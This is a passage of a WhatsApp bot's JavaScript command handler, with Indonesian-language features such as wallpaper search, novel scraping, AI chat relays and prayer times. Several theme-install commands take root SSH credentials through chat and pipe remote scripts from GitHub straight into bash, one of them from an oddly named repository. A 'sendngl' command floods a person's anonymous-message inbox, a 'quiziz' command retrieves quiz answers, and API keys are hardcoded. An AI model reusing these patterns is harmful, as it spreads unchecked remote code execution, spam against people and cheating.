    }, { quoted: m });
  }
}
break
case 'wallpaper': {
  const axios = require('axios')
  const CryptoJS = require('crypto-js')
  const api = {
    base: 'https://minimal.4everwallpaper.in/apiV2/api.php',
    image: 'https://minimal.4everwallpaper.in/images/',
    package: 'com.minimal.wallpaper',
    secretKey: 'A40DA80A59D170CAA950CF15C18C454D47A39B26989D8B640ECD745BA71BF5DC',
    endpoints: {
      search: (query, offset = 0, limit = 10) => `?getwallpapersbysearch&search=${query}&offset=${offset}&limit=${limit}`,
      category: (cid, orderby = 'latest', offset = 0) => `?getwallpapersbycategory&cid=${cid}&orderby=${orderby}&offset=${offset}`,
      categories: () => '?getcategories'
    }
  }
  const headers = {
    'user-agent': 'Postify/1.0.0',
    'connection': 'Keep-Alive',
    'accept-encoding': 'gzip'
  }

  function generateSecureKey() {
    try {
      const hash = api.secretKey
      const date = new Date()
      date.setTime(date.getTime() + (5.5 * 60 * 60 * 1000))
      const tai = date.toISOString().replace('T', ' ').replace(/\.\d+Z$/, '')
      const secureStr = `package=${api.package},key=${hash},time=${tai}`
      return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(secureStr))
    } catch (err) {
      return null
    }
  }

  function getCategories() {
    const url = `${api.base}${api.endpoints.categories()}`
    return axios.get(url, {
      headers: {
        ...headers,
        'SECURE_KEY': generateSecureKey()
      }
    }).then(res => {
      if (!res.data?.length) throw new Error("Kategori tidak ditemukan.")
      return res.data.map(c => ({
        id: c.cid,
        name: c.category_name,
        image: c.category_image,
        status: c.status
      }))
    })
  }

  function searchWallpapers(query, limit = 10) {
    const url = `${api.base}${api.endpoints.search(query, 0, limit)}`
    return axios.get(url, {
      headers: {
        ...headers,
        'SECURE_KEY': generateSecureKey()
      }
    }).then(res => {
      if (!res.data?.length) throw new Error("Tidak ditemukan wallpaper.")
      return res.data.map(w => ({
        id: w.id,
        name: w.wallpaper_name,
        image: api.image + w.wallpaper_image,
        views: w.wallpaper_views
      }))
    })
  }

  function getWallByCategory(catName, orderby = 'latest') {
    return getCategories().then(categories => {
      const found = categories.find(c => c.name.toLowerCase() === catName.toLowerCase())
      if (!found) throw new Error(`Kategori '${catName}' tidak ditemukan.`)
      const url = `${api.base}${api.endpoints.category(found.id, orderby)}`
      return axios.get(url, {
        headers: {
          ...headers,
          'SECURE_KEY': generateSecureKey()
        }
      }).then(res => {
        if (!res.data?.length) throw new Error("Wallpaper dari kategori tersebut tidak ditemukan.")
        return res.data.map(w => ({
          id: w.id,
          name: w.wallpaper_name,
          image: api.image + w.wallpaper_image,
          views: w.wallpaper_views
        }))
      })
    })
  }
  const args = q.trim().split(/\s+/)
  const sub = argsbiyuoffc[0]?.toLowerCase()
  const val1 = argsbiyuoffc[1]
  const val2 = argsbiyuoffc[2]
  if (!sub) {
    return m.reply(`Contoh penggunaan:\n
*${prefix}wallpaper search batman*
*${prefix}wallpaper cat nature*
*${prefix}wallpaper cats*`)
  }
  if (sub === 'search') {
    if (!val1) return m.reply('Masukkan kata kunci pencarian!')
    searchWallpapers(val1).then(res => {
      let teks = res.map((v, i) =>
        `*${i + 1}. ${v.name}*\nViews: ${v.views}\n${v.image}`
      ).join('\n\n')
      m.reply(teks)
    }).catch(e => m.reply(`Gagal cari wallpaper:\n${e.message}`))
  }
  else if (sub === 'cat') {
    if (!val1) return m.reply('Masukkan nama kategori!')
    getWallByCategory(val1, val2 || 'latest').then(res => {
      let teks = res.map((v, i) =>
        `*${i + 1}. ${v.name}*\nViews: ${v.views}\n${v.image}`
      ).join('\n\n')
      m.reply(teks)
    }).catch(e => m.reply(`Gagal ambil kategori:\n${e.message}`))
  }
  else if (sub === 'cats') {
    getCategories().then(cats => {
      const list = cats.map((v, i) => `*${i + 1}. ${v.name}*`).join('\n')
      m.reply(`Daftar kategori wallpaper:\n\n${list}`)
    }).catch(e => m.reply(`Gagal ambil kategori:\n${e.message}`))
  }
  else {
    m.reply(`Subcommand '${sub}' gak dikenal.\nGunakan salah satu:\n- search\n- cat\n- cats`)
  }
}
break
case 'uhdpaper':
case 'swallpaper':
case 'searchwallpaper': {
    if (!text) return m.reply('Contoh: uhdpaper Anime,3');
    try {
        const axios = require("axios");
        const cheerio = require('cheerio');
        let [query, jumlah] = text.split(',');
        query = query.trim();
        jumlah = parseInt(jumlah) || 3;
        if (jumlah > 10) jumlah = 10; 
        const res = await axios.get(`https://www.uhdpaper.com/search?q=${encodeURIComponent(query)}&by-date=true`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
                "Accept": "*/*",
            },
        });
        const $ = cheerio.load(res.data);
        let hasil = [];
        $('.post-outer').each((_, el) => {
            const title = $(el).find('h2').text().trim();
            const resolution = $(el).find('b').text().trim();
            const image = $(el).find('img').attr('src');
            const description = $(el).find('p').text().trim();
            const source = $(el).find('a').text().trim();
            const link = $(el).find('a').attr('href');
            hasil.push({ title, resolution, image, description, source, link });
        });
        if (hasil.length === 0) return m.reply('Gagal menemukan wallpaper.');
        if (jumlah > hasil.length) jumlah = hasil.length;
        for (let i = 0; i < jumlah; i++) {
            const w = hasil[i];
            await conn.sendMessage(m.chat, {
                image: { url: w.image },
                caption: `*${w.title}*\nResolusi: ${w.resolution}\nDeskripsi: ${w.description}\nLink: ${w.link}`
            }, { quoted: m });
        }
    } catch (e) {
        console.log(e);
        m.reply('Terjadi kesalahan saat mengambil data.');
    }
}
break
  case "ai-v2": case '.':
case "heckai":
 if (!argsbiyuoffc.length) {
 return m.reply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *heckai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(argsbiyuoffc.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return reply("❌ AI tidak dapat memberikan jawaban.");
 }
 m.reply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 m.reply("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break

case "installtemanook":
case "temanook":
case "nooktheme": {
  if (!text || !text.includes('|')) {
    return m.reply("⚠️ Format salah!\n\nGunakan format:\n.temanook ip|password\n\nContoh:\n.nooktheme 192.168.1.10|mypassword");
  }
  const [ip, password] = text.split('|').map(v => v.trim());
  if (!ip || !password) return m.reply("❌ IP atau password tidak boleh kosong.");
  const { Client } = await import('ssh2');
  let ssh = new Client();
  m.reply('🔧 Menghubungkan ke VPS dan mulai instalasi tema Nook...');
  ssh.on('ready', () => {
    m.reply('✅ Terhubung ke VPS!\n▶️ Memulai proses instalasi Nook Theme...');
    ssh.exec(`bash -c "
set -e
cd /var/www/pterodactyl
php artisan down
curl -L https://github.com/Nookure/NookTheme/releases/latest/download/panel.tar.gz | tar -xzv
chmod -R 755 storage/* bootstrap/cache
command -v composer >/dev/null 2>&1 || { curl -sS https://getcomposer.org/installer | php && mv composer.phar /usr/local/bin/composer; }
composer install --no-dev --optimize-autoloader --no-interaction
php artisan view:clear
php artisan config:clear
php artisan migrate --seed --force
chown -R www-data:www-data /var/www/pterodactyl/*
php artisan queue:restart
php artisan up
"`, async (err, stream) => {
      if (err) {
        m.reply("❌ Gagal mengeksekusi perintah di VPS.");
        return ssh.end();
      }
      stream.on('data', (data) => {
        console.log(`[VPS stdout]: ${data.toString()}`);
      });
      stream.stderr.on('data', (data) => {
        console.error(`[VPS stderr]: ${data.toString()}`);
      });
      stream.on('close', async () => {
        await conn.sendMessage(m.chat, {
          text: '✅ *Nook Theme berhasil diinstal!*\nServer kembali online.',
          footer: `© 2025 Biyu-Official`,
          quoted: m
        });
        ssh.end();
      });
    });
  }).on('error', (err) => {
    m.reply(`❌ Gagal konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: 'root',
    password: password
  });
}
break

case "temaelysium": case "installtemaelysium": {
    if (!isOwner) return Reply(mess.owner);
    if (!text || text.split("|").length < 2) return m.reply(example("ipvps|pwvps"));
    let [ipvps, passwd] = text.split("|");
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await Reply("Berhasil install *tema Elysium* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
                stream.write('yes\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break
case "temanightcore": case "installtemanightcore": {
    if (!isOwner) return Reply(mess.owner);
    if (!text) return m.reply("username@ipvps|pwvps");
    let vii = text.split("|");
    if (vii.length < 2) return m.reply("username@ipvps|pwvps");
    let ipInput = vii[0];
    let passwd = vii[1];
    let uservps = "root"; 
    let ipvps = ipInput;
    if (ipInput.includes("@")) { 
        let splitIP = ipInput.split("@");
        uservps = splitIP[0]; 
        ipvps = splitIP[1];
    }
    const biyuSettings = {
        host: ipvps,
        port: '22',
        username: uservps,
        password: passwd
    };
    const command = `bash <(curl -s https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
    const ress = new Client();
    ress.on('ready', async () => {
        m.reply(`🔹 *Memproses install tema Nightcore*\nTunggu 1-10 menit...\n\n🖥️ VPS: ${ipvps}\n👤 User: ${uservps}`);
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await m.reply("✅ *Tema Nightcore berhasil diinstall!*");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error:', err);
        m.reply('❌ *Gagal terhubung!* Kata sandi, username, atau IP tidak valid.');
    }).connect(biyuSettings);
}
break
case "installtema": case "installthema": {
 if (!text) return m.reply(`Contoh : ${prefix + command} ipvps|pwvps`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
 const messageText = `Yuk pilih *thema* yang ingin kamu install! Klik tombol di bawah ini.`;
 await conn.sendMessage(m.chat, {
 image: { url: global.image.menu },
 caption: messageText,
 footer: 'Install Thema 😌',
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: '🎨 Pilih Thema' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Thema Pterodactyl',
 sections: [
 {
 title: '🔥 Thema Premium',
 rows: [
{ title: 'Tema Enigma', description: 'Ciptakan tampilan elegan dan misterius dengan Tema Enigma.', id: `${prefix}installtemaenigma ${safeText}` },
{ title: 'Tema Nook', description: 'Tampilan bersih dan modern untuk panel kamu dengan Tema Nook.', id: `${prefix}installtemanook ${safeText}` },
{ title: 'Tema Nightcore', description: 'Desain modern nan bersih, cocok untuk kamu yang suka nuansa gelap elegan.', id: `${prefix}installtemanightcore ${safeText}` },
{ title: 'Tema Elysium', description: 'Desain stylish dan premium hadir lewat Tema Elysium.', id: `${prefix}installtemaelysium ${safeText}` },
{ title: 'Tema Nebula', description: 'UI futuristik dan modern yang menawan dari Tema Nebula.', id: `${prefix}installtemanebula ${safeText}` },
{ title: 'Tema Stellar', description: 'Minimalis dan smooth — itulah Tema Stellar.', id: `${prefix}installtemastellar ${safeText}` },
{ title: 'Tema Billing', description: 'Tampilan rapi khusus untuk halaman billing kamu.', id: `${prefix}installtemabilling ${safeText}` }
 ]
 },
 {
 title: '💡 Lainnya',
 rows: [
 { title: 'Install Depend (Thema Nebula)', description: 'Wajib sebelum install Thema Nebula.', id: `${prefix}installdepend ${safeText}` }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender],
 externalAdReply: {
 title: global.botname2,
 thumbnailUrl: global.image.menu,
 sourceUrl: linkGrup,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });
 } catch (error) {
 console.error('Error di case installtema:', error);
 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break
case 'saku': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  let [subcommand, ...argsbiyuSub] = args
  if (!subcommand) {
    return m.reply(`Contoh:\nsaku search takane no hana\nsaku info <link>\nsaku baca <link>`)
  }

  if (subcommand === 'search') {
    const keyword = argsbiyuSub.join(' ')
    if (!keyword) return m.reply(`Masukkan judul yang ingin dicari.\nContoh: saku search overlord`)
   await axios.post( 'https://sakuranovel.id/wp-admin/admin-ajax.php',
      `action=data_fetch&keyword=${encodeURIComponent(keyword)}`,
      {
        headers: {
          accept: '*/*',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          origin: 'https://sakuranovel.id',
          referer: 'https://sakuranovel.id',
          'user-agent': 'Mozilla/5.0',
          'x-requested-with': 'XMLHttpRequest'
        }
      }
    ).then(({ data }) => {
      const $ = cheerio.load(data)
      const result = $('.searchbox').map((_, el) => ({
        title: $(el).find('a').attr('title'),
        link: $(el).find('a').attr('href'),
        thumbnail: $(el).find('img').attr('src')?.split('?')[0],
        type: $(el).find('.type').map((_, el) => $(el).text().trim()).get(),
        status: $(el).find('.status').text()?.trim(),
      })).get()
      if (!result.length) return m.reply('Novel tidak ditemukan.')
      let teks = `Hasil Pencarian:\n\n`
      for (let x of result) {
        teks += `• *${x.title}*\n`
        teks += `Status: ${x.status}\n`
        teks += `Type: ${x.type.join(', ')}\n`
        teks += `Link: ${x.link}\n\n`
      }
      m.reply(teks.trim())
    }).catch(e => m.reply(`Gagal cari: ${e.message}`))
  }

  if (subcommand === 'info') {
    const url = argsbiyuSub[0]
    if (!url || !url.startsWith('http')) return m.reply(`Contoh: saku info https://sakuranovel.id/novel/xxx/`)
    await axios.get(`https://kaviaann-cloudflare.hf.space/scrape?url=${url}`)
    .then(({ data }) => {
      const $ = cheerio.load(data)
      const el = $('.series .container .series-flex')
      const kr = el.find('.series-flexleft')
      const kn = el.find('.series-flexright')
      const title = kr.find('.series-titlex h2').text()?.trim()
      const thumbnail = kr.find('img').attr('src')
      const synops = kn.find('.series-synops p').map((_, el) => $(el).text().trim()).get().join('\n')
      const info = kr.find('.series-infoz.block span').map((_, el) => ({
        category: $(el).attr('class')?.split(' ')[0],
        value: $(el).text()?.trim(),
      })).get().concat(
        kr.find('ul.series-infolist li').map((_, el) => {
          const s = $(el).find('span')
          return {
            category: $(el).find('b').text().toLowerCase(),
            value: s.text(),
          }
        }).get()
      )
      const ratings = +kr.find('.series-infoz.score span[itemprop="ratingValue"]').text().trim() || 0
      const favorite = +kr.find('button.bookmark').attr('data-favoritecount') || 0
      const genres = kn.find('.series-genres a').map((_, el) => $(el).text().trim()).get()
      const chapter = kn.find('ul.series-chapterlists li').map((_, el) => ({
        title: $(el).find('a').attr('title'),
        link: $(el).find('a').attr('href'),
        date: $(el).find('span.date').text(),
      })).get()
      let teks = `*${title}*\n\n`
      teks += `Genres: ${genres.join(', ')}\n`
      teks += `Rating: ${ratings}\n`
      teks += `Favorite: ${favorite}\n\n`
      teks += `*Informasi:*\n`
      for (let x of info) {
        teks += `- ${x.category}: ${x.value}\n`
      }
      teks += `\n*Sinopsis:*\n${synops}\n\n`
      teks += `*Chapters:*\n`
      for (let x of chapter.slice(0, 10)) {
        teks += `- ${x.title}\n${x.link}\n`
      }
      conn.sendMessage(m.chat, {
        image: { url: thumbnail },
        caption: teks
      }, { quoted: m })
    }).catch(e => m.reply(`Gagal ambil info: ${e.message}`))
  }

  if (subcommand === 'baca') {
    const url = argsbiyuSub[0]
    if (!url || !url.startsWith('http')) return m.reply(`Contoh: saku baca https://sakuranovel.id/novel/xxx/`)
    await axios.get(`https://kaviaann-cloudflare.hf.space/scrape?url=${url}`)
    .then(({ data }) => {
      const $ = cheerio.load(data)
      const content = $('main .content')
      const title = content.find('h2.title-chapter').text().trim()
      const novel = content.find('.asdasd p')
        .slice(0, -1)
        .map((_, el) => $(el).text().trim()).get()

      let teks = `*${title}*\n\n${novel.join('\n')}`
      m.reply(teks)
    }).catch(e => m.reply(`Gagal ambil isi novel: ${e.message}`))
  }
}
break
case 'sendngl': {
  if (!text.includes('|')) return m.reply('Format salah!\nContoh: .sendngl link | pesan | jumlah');
  let [link, pesan, jumlah] = text.split('|').map(v => v.trim());
  jumlah = parseInt(jumlah);
  if (!link.startsWith('https://ngl.link/')) return m.reply('Link NGL tidak valid!');
  if (!pesan) return m.reply('Pesan tidak boleh kosong!');
  if (isNaN(jumlah) || jumlah < 1) return m.reply('Jumlah harus angka lebih dari 0!');
  let username = link.split('https://ngl.link/')[1];
  if (!username) return m.reply('Username NGL tidak ditemukan di link!');
  const fetch = (...argsbiyu) => import('node-fetch').then(({default: fetch}) => fetch(...argsbiyu));
  const abiyu = ms => new Promise(resolve => setTimeout(resolve, ms));
  m.reply(`Mengirim pesan ke NGL @${username} sebanyak ${jumlah} kali...`);
  for (let i = 0; i < jumlah; i++) {
    try {
      await fetch('https://ngl.link/api/submit', {
        method: 'POST',
        headers: {
          'accept': '*/*',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        },
        body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=1`
      });
      await abiyu(1000); 
    } catch (err) {
      console.log('Nyocot Erorr:', err);
    }
  }
  m.reply(`Selesai mengirim ${jumlah} pesan ke @${username}!\n\nGunakan Dengan Bijak\n> kennzy`);
}
break

case "quiziz":
 if (!q) return m.reply("Masukkan kode Quizizz!\nContoh: quiziz 32993496");
 let apiUrl = `https://api.maelyn.tech/api/quizizz?pin=${q}&apikey=Mbv133tl1l`;
 try {
 let response = await fetch(apiUrl);
 let data = await response.json();
 if (data.status !== "Success") return m.reply("Gagal mengambil data Quizizz.");
 let result = data.result;
 if (!result.length) return m.reply("Tidak ada soal yang ditemukan.");
 let message = `📚 *Quizizz (${q})*\n\n`;
 for (let i = 0; i < result.length; i++) {
 let soal = result[i].question.text;
 let jawaban = result[i].answer.text;
 message += `*Soal ${i + 1}:* ${soal}\n*Jawaban:* ${jawaban}\n\n`;
 }
 m.reply(message);
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil data Quizizz.");
 }
 break
 
case 'waktudunia':
async function waktu() {
    const url = 'https://onlinealarmkur.com/world/id/';
    try {
const axios = require('axios');
        const {
            data
        } = await axios.get(url);
const cheerio = require('cheerio');
const moment = require('moment-timezone');
        const $ = cheerio.load(data);
        let hasil = [];
        $('.flex.items-center.space-x-3').each((index, element) => {
            const bndera = $(element).find('.avatar .text-2xl').text().trim();
            const kota = $(element).find('.city-name').text().trim();
            const Zona = $(element).find('.city-time').attr('data-tz');
            if (Zona) {
                const realTime = moment().tz(Zona).format('ddd - HH:mm');
                hasil.push({
                    bndera,
                    kota,
                    waktu: realTime
                });
            }
        });
        return hasil;
    } catch (error) {
        return [];
    }
}

let hasilWaktu = await waktu();
if (hasilWaktu.length === 0) {
    return conn.sendMessage(m.chat, {
        text: 'Gagal mengambil data waktu'
    }, {
        quoted: m
    });
}

let pesanWaktu = '*🕰️ Waktu Dunia Saat Ini 🕰️*\n\n';
hasilWaktu.forEach(item => {
    pesanWaktu += `${item.bndera} *${item.kota}* - ${item.waktu}\n`;
});

await conn.sendMessage(m.chat, {
    text: pesanWaktu
}, {
    quoted: m
});
break
case 'zerogpt':
  if (!q) return m.reply('Masukkan teks yang mau ditanyakan, contoh: .zerogpt apa itu air');
  try {
    const axios = require('axios');
    const id = () => Math.random().toString(36).slice(2, 18);
    const res = await axios.post('https://zerogptai.org/wp-json/mwai-ui/v1/chats/submit', {
      botId: "default",
      customId: null,
      session: "N/A",
      chatId: id(),
      contextId: 39,
      messages: [],
      newMessage: q,
      newFileId: null,
      stream: true
    }, {
      headers: {
        'Content-Type': 'application/json',
        'X-WP-Nonce': 'e7b64e1953',
        'Accept': 'text/event-stream'
      },
      responseType: 'stream'
    });
    let out = '';
    res.data.on('data', chunk => {
      chunk.toString().split('\n').forEach(line => {
        if (line.startsWith('data: ')) {
          const data = JSON.parse(line.slice(6));
          if (data.type === 'live') out += data.data;
          if (data.type === 'end') m.reply(out.trim());
        }
      });
    });
  } catch (e) {
    m.reply('Error: ' + e.message);
  }
  break
case 'gpt': {
    if (!text) return m.reply('Tanya Apa');
    const axios = require('axios');
    const cheerio = require('cheerio');
    const FormData = require('form-data');

    const generateRandomString = (length) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };

    const getNonce = async () => {
        try {
            const { data } = await axios.get("https://chatgpt4o.one/", {
                headers: {
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml",
                }
            });
            const $ = cheerio.load(data);
            return $("div.wpaicg-chat-shortcode").attr("data-nonce") || null;
        } catch (err) {
            console.error("Nonce Error:", err.message);
            return null;
        }
    };

    const sendChat = async (msg) => {
        try {
            const nonce = await getNonce();
            if (!nonce) throw new Error("Nonce not found");

            const clientId = generateRandomString(10);
            const formData = new FormData();
            formData.append("_wpnonce", nonce);
            formData.append("post_id", 11);
            formData.append("url", "https://chatgpt4o.one/");
            formData.append("action", "wpaicg_chat_shortcode_message");
            formData.append("message", msg);
            formData.append("bot_id", 0);
            formData.append("chatbot_identity", "shortcode");
            formData.append("wpaicg_chat_history", JSON.stringify([]));
            formData.append("wpaicg_chat_client_id", clientId);

            const { data } = await axios.post(
                "https://chatgpt4o.one/wp-admin/admin-ajax.php",
                formData,
                {
                    headers: {
                        ...formData.getHeaders(),
                        "User-Agent": "Mozilla/5.0",
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest"
                    }
                }
            );
            return data;
        } catch (err) {
            console.error("Chat Error:", err.message);
            return null;
        }
    };

    const res = await sendChat(text);
    if (!res) return m.reply('Gagal Dapat Responnya');
    m.reply(res.data || res.message || 'Gak Ada Respon');
}
break
case "ai": case "openai":  {
  let talk = text ? text : (m.quoted ? m.quoted.text : "hai")
  await fetchJson(`https://api.simplebot.my.id/api/tools/openai?prompt=Kamu adalah AI yang selalu memakai bahasa Indonesia dan ceria&msg=${talk}`)
    .then(async (res) => {
      await m.reply(res.result)
    })
    .catch(e => m.reply(e.toString()))
}
break

case 'upch': case 'upchannel':
case 'sendch': {
    if (!isCreator) return Reply(mess.owner);
    const biyusender = m.key.remoteJid;
    const name = conn.getName ? await conn.getName(biyusender) : 'kamu';
    const targetChannel = targetChannelData.id;   
    if (!text && !(quoted && quoted.message)) {
        return m.reply(`Cara penggunaan *${prefix}upch*:\n\n` +
            `1. Balas media (foto/video/sticker/audio/dokumen) + ketik *${prefix}upch* untuk kirim media ke channel.\n\n` +
            `*Note:*\n` +
            `Sebelum pakai, pastikan sudah set target channel pakai perintah *${prefix}setch 120xxxx@newsletter*\n\n` +
            `> kennzy`);
    }
    conn.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    const contentText = text?.trim();
    const ppuser = await getBuffer(await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5232/591086746_biyuofficial.jpg'));
    const ctx = {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: targetChannel,
            serverMessageId: 20,
            newsletterName: 'Biyu - Official'
        },
        externalAdReply: {
            title: `⭐ Pesan dari ${name}`,
            body: `Runtime: ${runtime(process.uptime())} ⚙️`,
            thumbnail: ppuser,
            mediaType: 1,
            sourceUrl: 'https://linktr.ee/info_seputar_biyu.store'
        }
    };
    const isQuoted = quoted && quoted.message;
    if (isQuoted) {
        const type = Object.keys(quoted.message)[0];
        const media = await conn.downloadAndSaveMediaMessage(quoted);
        const fileName = quoted?.fileName || 'File.unknown';
        switch (type) {
            case 'imageMessage':
                await conn.sendMessage(targetChannel, { image: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'videoMessage':
                await conn.sendMessage(targetChannel, { video: { url: media }, caption: contentText || '', contextInfo: ctx });
                break;
            case 'audioMessage':
                await conn.sendMessage(targetChannel, { audio: { url: media }, mimetype: 'audio/mp4', ptt: quoted.message.audioMessage?.ptt || false, contextInfo: ctx });
                break;
            case 'stickerMessage':
                await conn.sendMessage(targetChannel, { sticker: { url: media }, contextInfo: ctx });
                break;
            case 'documentMessage':
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: quoted.mimetype || 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
            default:
                await conn.sendMessage(targetChannel, { document: { url: media }, mimetype: 'application/octet-stream', fileName: fileName, contextInfo: ctx });
                break;
        }
    } else if (contentText) {
        await conn.sendMessage(targetChannel, { text: contentText, contextInfo: ctx });
    }
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case 'setch': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Contoh: .setch 1203633xxxxx@newsletter');
    if (!text.includes('@newsletter')) return m.reply('Format salah! Harus ID channel berakhiran @newsletter.');
    targetChannelData.id = text.trim();
    saveTargetChannel();
    m.reply(`✅ Target channel berhasil diubah ke:\n\n${targetChannelData.id}`);
}
break

case 'upchat': {
    if (!isCreator) return Reply(mess.owner);
    if (!text && !(quoted && quoted.message)) {
        return m.reply(`Cara penggunaan *${prefix}upchat*:\n\n` +
            `1. Balas media (foto/video/sticker/audio/dokumen)\n` +
            `2. Ketik: *${prefix}upchat 628xxxxxxx*\n\n` +
            `*Contoh:* ${prefix}upchat 6285776461481`);
    }
    let cleanedText = text.replace(/[^0-9@]/g, ''); 
    if (cleanedText.startsWith('08')) cleanedText = '62' + cleanedText.slice(1); 
    if (cleanedText.startsWith('@')) cleanedText = cleanedText.slice(1);
    const numberMatch = cleanedText.match(/\d{10,15}/);
    if (!numberMatch) return m.reply('Nomor tidak valid!');
    const target = numberMatch[0] + '@s.whatsapp.net';
    const additionalCaption = text.replace(numberMatch[0], '').replace(/[^a-zA-Z0-9\s.,!?@]/g, '').trim();
    const name = conn.getName ? await conn.getName(m.sender) : 'Pengirim';
    const ppuser = await getBuffer(await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5232/591086746_biyuofficial.jpg'));
    const ctx = {
        mentionedJid: [m.sender],
        forwardingScore: 9999,
        isForwarded: true,
        externalAdReply: {
            title: `⭐ Pesan dari ${name}`,
            body: `Runtime: ${runtime(process.uptime())} ⚙️`,
            thumbnail: ppuser,
            mediaType: 1,
            sourceUrl: 'https://linktr.ee/info_seputar_biyu.store'
        }
    };
    if (quoted && quoted.message) {
        const type = Object.keys(quoted.message)[0];
        const media = await conn.downloadAndSaveMediaMessage(quoted);
        const fileName = quoted?.fileName || 'File.unknown';
        const quotedCaption = quoted.message?.[type]?.caption || '';
        const finalCaption = [quotedCaption, additionalCaption].filter(Boolean).join('\n');
        switch (type) {
            case 'imageMessage':
                await conn.sendMessage(target, { image: { url: media }, caption: finalCaption, contextInfo: ctx });
                break;
            case 'videoMessage':
                await conn.sendMessage(target, { video: { url: media }, caption: finalCaption, contextInfo: ctx });
                break;
            case 'audioMessage':
                await conn.sendMessage(target, {
                    audio: { url: media },
                    mimetype: 'audio/mp4',
                    ptt: quoted.message.audioMessage?.ptt || false
                });
                break;
            case 'stickerMessage':
                await conn.sendMessage(target, { sticker: { url: media }, contextInfo: ctx });
                break;
            case 'documentMessage':
                await conn.sendMessage(target, {
                    document: { url: media },
                    mimetype: quoted.mimetype || 'application/octet-stream',
                    fileName: fileName,
                    contextInfo: ctx
                });
                break;
            default:
                await conn.sendMessage(target, {
                    document: { url: media },
                    mimetype: 'application/octet-stream',
                    fileName: fileName,
                    contextInfo: ctx
                });
                break;
        }
        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } else {
        m.reply('Balas media yang ingin kamu kirim ke target.');
    }
}
break

case 'jadwalsholat': case 'jadwalshalat': case 'jadwalsolat': case 'jadwalsalat': {
    if (!q) return m.reply('Masukkan nama kota!\nContoh: jadwalsholat Jakarta');
    const axios = require("axios");
    const cheerio = require("cheerio");
    const moment = require("moment-timezone");
    async function getKodeWilayah(kota) {
        try {
            const { data } = await axios.get("https://jadwalsholat.org/jadwal-sholat/monthly.php", {
                headers: { "User-Agent": "Mozilla/5.0" }
            });
            const $ = cheerio.load(data);
            let result = null;
            $("option").each((i, el) => {
                const kode = $(el).attr("value");
                const namaKota = $(el).text().trim().toLowerCase();
                if (namaKota === kota.toLowerCase()) {
                    result = parseInt(kode);
                    return false; 
                }
            });
            return result;
        } catch (error) {
            console.error("Error getKodeWilayah:", error.message);
            return null;
        }
    }
    async function getJadwalSholat(kodeWilayah) {
        try {
            const url = `https://jadwalsholat.org/jadwal-sholat/monthly.php?id=${kodeWilayah}`;
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            let jadwal = [];
            $('tr[class^="table_"]').each((i, el) => {
                const tds = $(el).find("td");
                if (tds.length === 9) {
                    jadwal.push({
                        tanggal: $(tds[0]).text().trim(),
                        imsyak: $(tds[1]).text().trim(),
